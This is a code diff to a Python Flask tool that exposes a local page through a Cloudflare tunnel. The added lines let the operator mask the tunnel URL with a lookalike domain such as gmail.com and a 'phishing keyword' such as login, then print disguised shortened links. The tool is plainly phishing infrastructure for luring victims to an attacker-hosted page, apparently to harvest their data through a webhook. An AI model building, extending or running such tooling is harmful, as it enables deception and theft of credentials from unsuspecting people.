@@ -13,11 +13,16 @@ from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
 import signal
 from utils import get_file_data, update_webhook, check_and_get_webhook_url
+from urlmasker import generate_masked_urls, show_loading_screen
+
+
 
 # Global flag to handle graceful shutdown
 shutdown_flag = threading.Event()
 
 HTML_FILE_NAME = "index.html"
+
+
 
 if sys.stdout.isatty():
     R = '\033[31m'  # Red
@@ -86,6 +91,9 @@ def get_url():
 
 #run_flask function to handle threading
 def run_flask(folder_name):
+
+    
+
     try:
         os.chdir(folder_name)
     except FileNotFoundError:
@@ -116,13 +124,33 @@ signal.signal(signal.SIGINT, signal_handler)
 
 # Cloudflare tunnel with non-blocking handling
 def run_tunnel():
+    global weburl
+
+
     try:
         config = FlareConfig(
             port=args.port,
             verbose=True  # Enable logging for debugging
         )
-        with FlareTunnel(config) as tunnel:
+        
+        with FlareTunnel(config) as tunnel:  # Safely assign inside the context
+            weburl = tunnel.tunnel_url
             print(f"{G}[+] Flask app available at: {C}{tunnel.tunnel_url}{W}")
+            maskchoice=input(f"{B}[+] {Y}Do you want to mask the URL? (y/n): {W}")
+            if maskchoice.lower() == 'y':
+                custom_domain = input("Enter custom domain (e.g., gmail.com): ")
+                keyword = input("Enter phishing keyword (e.g., login): ")
+                show_loading_screen()
+                masked_urls = generate_masked_urls(weburl, custom_domain, keyword)
+                print(f"\n{Y}[~] Masked URLs (using multiple shorteners):{W}")
+                for i, masked_url in enumerate(masked_urls):
+                    print(f"{G}╰➤ Shortener {i + 1}:{W} {masked_url}")
+            
+
+            
+            
+            
+            
             
             # Keep the main thread running to monitor the shutdown flag
             while not shutdown_flag.is_set():
